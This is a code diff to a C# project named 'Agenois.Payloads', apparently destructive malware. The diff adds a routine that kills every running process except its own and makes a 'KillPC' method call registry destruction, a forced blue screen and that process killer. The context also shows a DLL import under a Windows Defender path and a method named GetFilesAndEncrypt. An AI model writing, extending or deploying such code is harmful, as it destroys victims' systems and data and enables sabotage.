@@ -84,9 +84,27 @@ namespace Agenois.Payloads
         [DllImport(@"C:\Windows\System32\Defender\Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?EnableCriticalMode@Payloads@1@QAEXXZ")]
         public static extern bool EnableCriticalMode();
 
+        public static void KillAllProcesses()
+        {
+            Process[] allProcesses = Process.GetProcesses();
+            foreach(Process proc in allProcesses)
+            {
+                if (proc.ToString() != Process.GetProcessesByName("Agenois")[0].ToString())
+                {
+                    try
+                    {
+                        proc.Kill();
+                    }
+                    catch { }
+                }
+            }
+        }
+
         public static void KillPC()
         {
-
+            DestroyRegistry();
+            BSOD();
+            KillAllProcesses();
         }
 
         static void GetFilesAndEncrypt(string Ps)
